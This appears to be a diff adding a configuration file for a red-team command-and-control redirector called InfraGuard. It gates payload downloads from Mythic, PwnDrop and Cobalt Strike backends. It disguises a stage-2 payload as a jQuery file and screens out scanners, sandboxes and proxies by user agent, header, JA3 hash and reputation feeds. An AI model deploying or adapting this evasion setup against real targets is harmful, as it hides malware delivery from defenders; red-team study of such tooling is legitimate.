@@ -1,0 +1,244 @@
+# ═══════════════════════════════════════════════════════════════════════
+# InfraGuard — Payload Delivery Showcase
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Demonstrates all four content backends with full OPSEC hardening:
+#
+#   mythic_file    - serve specific or dynamic Mythic-hosted payloads
+#   pwndrop        - serve files from a PwnDrop staging server
+#   filesystem     - serve files from the local filesystem / Docker volume
+#   http_proxy     - proxy to any HTTP server (RedFile, nginx, custom)
+#
+# Guard stack on every sensitive route:
+#   require_beacon_ip   → only IPs that completed N C2 checkins can fetch
+#   allowed_user_agents → Windows HTTP client UA required
+#   required_headers    → implant-specific header must match
+#   forbidden_headers   → reject Via, X-Forwarded-For (proxy/scanner)
+#   require_token       → single-use token issued at whitelist promotion
+#   rate_limit          → cap downloads per IP per window
+#
+# Stack:
+#   Internet → InfraGuard (443) → Payload backends (internal)
+#
+# Required env vars:
+#   INFRAGUARD_TLS_CERT       - path to TLS cert
+#   INFRAGUARD_TLS_KEY        - path to TLS key
+#   CS_UPSTREAM               - Cobalt Strike HTTPS listener URL
+#   MYTHIC_IP                 - Mythic server IP
+#   MYTHIC_STAGE2_FILE_ID     - UUID of stage-2 payload in Mythic
+#   MYTHIC_SHELLCODE_FILE_ID  - UUID of shellcode blob in Mythic
+#   PWNDROP_UPSTREAM          - PwnDrop URL, e.g. http://pwndrop:80
+#   PWNDROP_TOKEN             - PwnDrop API token
+#   REDFILE_UPSTREAM          - RedFile server URL
+#   INFRAGUARD_DB_PATH        - SQLite path
+
+listeners:
+  - protocol: "https"
+    bind: "0.0.0.0"
+    port: 443
+    tls:
+      cert: "${INFRAGUARD_TLS_CERT}"
+      key: "${INFRAGUARD_TLS_KEY}"
+    domains:
+      - "cdn.example.com"
+
+domains:
+  cdn.example.com:
+    upstream: "${CS_UPSTREAM}"
+    profile_path: "examples/jquery-c2.3.14.profile"
+    profile_type: "cobalt_strike"
+
+    drop_action:
+      type: "redirect"
+      target: "https://jquery.com"
+
+    content_routes:
+
+      # ── Backend 1: Mythic file (specific UUID) ─────────────────────
+      # Serves a specific payload file from Mythic's file store.
+      # file_id is the UUID; InfraGuard fetches /direct/download/<uuid>
+      # from the Mythic server. Unauthenticated endpoint protected by
+      # InfraGuard's full guard stack.
+      - path: "/jquery-3.7.1.min.js"
+        backend:
+          type: "mythic_file"
+          target: "https://${MYTHIC_IP}:7443"
+          file_id: "${MYTHIC_STAGE2_FILE_ID}"
+          ssl_verify: false
+          headers:
+            Content-Disposition: "attachment; filename=\"update.bin\""
+        guard:
+          require_beacon_ip: true
+          allowed_user_agents:
+            - "^Mozilla/5\\.0 \\(Windows NT"
+            - "WinHTTP"
+            - "Microsoft-CryptoAPI"
+          required_headers:
+            X-Requested-With: "XMLHttpRequest"
+          forbidden_headers:
+            - "Via"
+            - "X-Forwarded-For"
+            - "CF-Worker"
+        require_token: true
+        rate_limit:
+          enabled: true
+          max_downloads: 1
+          window_seconds: 3600
+        conditional:
+          score_threshold: 0.5
+          scanner_backend:
+            type: "http_proxy"
+            target: "https://jquery.com/jquery-3.7.1.min.js"
+        track: true
+
+      # ── Backend 2: Mythic file (proxy mode — dynamic UUID) ──────────
+      # Exposes all of Mythic's file store behind InfraGuard.
+      # UUID extracted from the incoming path — no file_id in config.
+      # Path pattern /dl/<uuid> → Mythic /direct/download/<uuid>.
+      # require_beacon_ip ensures only known implants can enumerate.
+      - path: "/dl/*"
+        backend:
+          type: "mythic_file"
+          target: "https://${MYTHIC_IP}:7443"
+          ssl_verify: false
+        guard:
+          require_beacon_ip: true
+          allowed_user_agents:
+            - "^Mozilla/5\\.0 \\(Windows NT"
+            - "WinHTTP"
+          forbidden_headers:
+            - "Via"
+            - "X-Forwarded-For"
+        rate_limit:
+          enabled: true
+          max_downloads: 5
+          window_seconds: 300
+        track: true
+
+      # ── Backend 3: PwnDrop ──────────────────────────────────────────
+      # Serves files from a PwnDrop instance. PwnDrop manages the file
+      # store; InfraGuard adds the guard stack on top.
+      # Token auto-issued when beacon is first dynamically whitelisted.
+      - path: "/downloads/*"
+        backend:
+          type: "pwndrop"
+          target: "${PWNDROP_UPSTREAM}"
+          auth_token: "${PWNDROP_TOKEN}"
+        guard:
+          require_beacon_ip: true
+          forbidden_headers:
+            - "Via"
+            - "X-Forwarded-For"
+        require_token: true
+        rate_limit:
+          enabled: true
+          max_downloads: 2
+          window_seconds: 300
+        conditional:
+          score_threshold: 0.5
+          scanner_backend:
+            type: "http_proxy"
+            target: "https://jquery.com"
+        track: true
+
+      # ── Backend 4: Filesystem ───────────────────────────────────────
+      # Serves files from a local directory on disk. No guard on this
+      # route — it serves cover/decoy files to unfiltered visitors.
+      # High rate limit prevents content discovery enumeration.
+      - path: "/assets/*"
+        backend:
+          type: "filesystem"
+          target: "/app/decoys"
+        rate_limit:
+          enabled: true
+          max_downloads: 10
+          window_seconds: 60
+        track: false                      # don't clutter logs with decoy hits
+
+      # ── Backend 5: HTTP proxy (RedFile) ────────────────────────────
+      # Proxies requests to a RedFile conditional delivery server.
+      # RedFile adds its own geofencing; InfraGuard adds beacon gating.
+      - path: "/share/*"
+        backend:
+          type: "http_proxy"
+          target: "${REDFILE_UPSTREAM}"
+          ssl_verify: false
+        guard:
+          require_beacon_ip: true
+          forbidden_headers:
+            - "Via"
+            - "X-Forwarded-For"
+        rate_limit:
+          enabled: true
+          max_downloads: 3
+          window_seconds: 300
+        track: true
+
+# ── One-time payload tokens ────────────────────────────────────────────
+# Tokens are issued in the X-Payload-Token response header when a beacon
+# IP is first promoted to the dynamic whitelist (after N valid C2 checkins).
+# Beacon must present the token in X-DL-Token (or ?_t=) to fetch any route
+# with require_token: true. Atomic SQLite UPDATE prevents replay.
+payload_tokens:
+  enabled: true
+  default_ttl_seconds: 3600
+  default_max_uses: 1
+  token_header: "X-DL-Token"
+  token_param: "_t"
+  issuance_header: "X-Payload-Token"
+
+pipeline:
+  filter_mode: "scoring"
+  block_score_threshold: 0.7
+  enable_ip_filter: true
+  enable_bot_filter: true
+  enable_header_filter: true
+  enable_geo_filter: true
+  enable_dns_filter: true
+  enable_profile_filter: true
+  enable_replay_filter: true
+  replay_window_seconds: 86400
+  replay_persist: true
+  enable_enumeration_filter: true
+  enumeration_unique_path_threshold: 20
+  enumeration_unique_path_suspect_threshold: 8
+  enumeration_window_seconds: 60
+  enable_sandbox_filter: true
+  enable_ja3_filter: true
+  ja3_filter:
+    ja3_header: "x-ja3"
+    log_ja3: true
+    block_unknown: false
+    blocked_ja3:
+      - "e7d705a3286e19ea42f587b344ee6865"
+      - "c35b0c7bd583d49d5b0f17de25ecdf7a"
+      - "6734f37431670b3ab4292b8f60f29984"
+      - "b386946a5a44d1ddcc843bc75336dfce"
+
+intel:
+  auto_block_scanners: true
+  dynamic_whitelist_threshold: 3
+  feeds:
+    enabled: true
+    refresh_interval_hours: 12
+  ct_monitor:
+    enabled: true
+    interval_hours: 6.0
+  reputation_monitor:
+    enabled: true
+    interval_hours: 4.0
+    check_urlhaus: true
+    check_openphish: false
+
+tracking:
+  db_path: "${INFRAGUARD_DB_PATH}"
+  retention_days: 30
+
+api:
+  bind: "127.0.0.1"
+  port: 8080
+  health_path: "/up"
+
+logging:
+  level: "INFO"
+  format: "json"
